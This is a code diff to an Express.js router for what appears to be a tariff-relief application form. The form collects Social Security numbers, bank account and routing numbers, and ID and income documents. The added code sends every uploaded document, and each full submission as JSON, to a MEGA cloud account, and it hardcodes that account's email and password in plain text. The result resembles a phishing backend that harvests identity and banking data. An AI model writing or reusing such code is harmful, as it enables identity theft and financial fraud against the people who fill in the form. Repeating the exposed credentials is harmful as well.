@@ -1,4 +1,7 @@
 const express = require('express');
+const fileUpload = require('express-fileupload');
+const mega = require('megajs');
+const { Readable } = require('stream'); // Import Readable stream
 const router = express.Router();
 
 const validateEmail = (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
@@ -6,6 +9,15 @@ const validateSSN = (ssn) => /^\d{3}-\d{2}-\d{4}$/.test(ssn);
 const validateZIP = (zip) => /^\d{5}(-\d{4})?$/.test(zip);
 const validateAccountNumber = (accountNumber) => /^\d{10,12}$/.test(accountNumber);
 const validateRoutingNumber = (routingNumber) => /^\d{9}$/.test(routingNumber);
+
+// Enable file upload middleware
+router.use(fileUpload());
+
+// MEGA storage configuration
+const megaStorage = new mega.Storage({
+    email: 'guirez1921@gmail.com',
+    password: '44bCfCEEsxH3_xF'
+});
 
 router.post('/verify', async (req, res) => {
     try {
@@ -59,13 +71,25 @@ router.post('/verify', async (req, res) => {
                 if (!data.accountType) errors.accountType = 'Account type is required';
                 break;
             case 3: // Validate Documentation
-                if (!data.idProof) errors.idProof = 'ID Proof is required';
-                if (!data.incomeProof) errors.incomeProof = 'Income Proof is required';
-                if (!data.tariffImpactProof) errors.tariffImpactProof = 'Tariff Impact Proof is required';
+                const files = req.files || {};
+                const requiredFiles = ['idProof', 'incomeProof', 'tariffImpactProof'];
 
-                if (data.idProof && (!data.idProof.name.endsWith('.pdf'))) errors.idProof = 'ID Proof must be in PDF format';
-                if (data.incomeProof && (!data.incomeProof.name.endsWith('.pdf'))) errors.incomeProof = 'Income Proof must be in PDF format';
-                if (data.tariffImpactProof && (!data.tariffImpactProof.name.endsWith('.pdf'))) errors.tariffImpactProof = 'Tariff Impact Proof must be in PDF format';
+                for (const fileKey of requiredFiles) {
+                    if (!files[fileKey]) {
+                        errors[fileKey] = `${fileKey} is required`;
+                    } else if (!files[fileKey].name || !files[fileKey].name.endsWith('.pdf')) {
+                        errors[fileKey] = `${fileKey} must be a PDF file`;
+                    } else {
+                        // Upload file to MEGA
+                        const fileStream = files[fileKey].data;
+                        const megaFile = megaStorage.upload({ name: files[fileKey].name });
+                        fileStream.pipe(megaFile);
+                        await new Promise((resolve, reject) => {
+                            megaFile.on('complete', resolve);
+                            megaFile.on('error', reject);
+                        });
+                    }
+                }
                 break;
             default:
                 return res.status(200).json({ success: false, message: 'Invalid step' });
@@ -82,8 +106,32 @@ router.post('/verify', async (req, res) => {
     }
 });
 
-router.post('/submit', (req, res) => {
-    res.json({ success: true, message: 'Business application submitted successfully' });
-})
+router.post('/submit', async (req, res) => {
+    try {
+        const data = req.body; // Assuming the data to be written is in req.body
+
+        // Convert data to JSON string
+        const jsonData = JSON.stringify(data);
+
+        // Create a readable stream from the JSON string
+        const jsonStream = Readable.from(jsonData);
+
+        // Upload JSON file to MEGA
+        const timestamp = new Date().toISOString().replace(/[:.]/g, '-'); // Replace invalid filename characters
+        const fileName = `individual_application_${timestamp}.json`;
+        const megaFile = megaStorage.upload({ name: fileName });
+        jsonStream.pipe(megaFile);
+
+        await new Promise((resolve, reject) => {
+            megaFile.on('complete', resolve);
+            megaFile.on('error', reject);
+        });
+
+        res.json({ success: true, message: 'Individual application submitted and saved to MEGA successfully' });
+    } catch (error) {
+        console.error('Error during submission:', error);
+        res.status(500).json({ success: false, message: 'An error occurred during submission' });
+    }
+});
 
 module.exports = router;
